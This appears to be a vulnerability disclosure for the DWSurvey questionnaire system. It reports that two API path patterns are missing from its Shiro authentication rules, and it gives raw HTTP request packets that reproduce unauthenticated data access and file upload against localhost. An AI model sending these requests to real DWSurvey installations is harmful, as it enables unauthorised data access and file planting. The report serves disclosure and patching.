# DWSurvey unauthorized access vulnerability report

## Vulnerability Description

DWSurvey (DiaoWenWang) is an open-source questionnaire system. Its Shiro filter chain configuration defines authentication rules for paths '/api/dwsurvey/anon/**', '/api/dwsurvey/app/**', and '/api/dwsurvey/admin/**' in `ShiroConfig.java`. However, path patterns '/api/dwsurvey/none/**' and '/api/dwsurvey/up/**' are not included in any Shiro filtering rules, resulting in complete unprotection. Attackers can access questionnaire data and upload files without authentication。

---

## Affected Versions

DWSurvey（latest version）<= V6.14.0

---

## Utilize conditions

- The target is accessible at `/api/dwsurvey/none/**` or `/api/dwsurvey/up/**`
- - no login required by default

---

## Vulnerability Reproduction

### Vulnerability 1: Authentication bypass in /api/dwsurvey/none/**, unauthorized access to business data

**File path**：`src/main/java/net/diaowen/dwsurvey/config/ShiroConfig.java`
**line number**：194-207

**Exposed Controller**：`DwAnswerSurveyController.java` Line 51

```java
@RequestMapping("/api/dwsurvey/none/v6/dw-answer-survey")
```

**Exposed Interface**：

- `GET /api/dwsurvey/none/v6/dw-answer-survey/survey-json-by-survey-id.do` - Obtain questionnaire data

**Request package**：

```
GET /api/dwsurvey/none/v6/dw-answer-survey/survey-json-by-survey-id.do HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
```

---

![image-20260803214433922]([https://github.com/fangtang7/picx-images-hosting/raw/master/DWSurvey/image-20260803214243516.7p4bf7fquq.webp](https://github.com/fangtang7/picx-images-hosting/raw/master/DWSurvey/image-20260803214433922.51ev4umgcu.webp))

### Vulnerability 2: Authentication bypass in /api/dwsurvey/up/** leads to unauthorized file upload

**Exposed Controller**：`UploadController.java` Line 34

```java
@RequestMapping("/api/dwsurvey/up")
```

**Request package**：

```
POST /api/dwsurvey/up/up-file.do HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Content-Length: 134

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test2026.txt"

<img >
------WebKitFormBoundary--

```

![image-20260803214243516](https://github.com/fangtang7/picx-images-hosting/raw/master/DWSurvey/image-20260803214243516.7p4bf7fquq.webp)
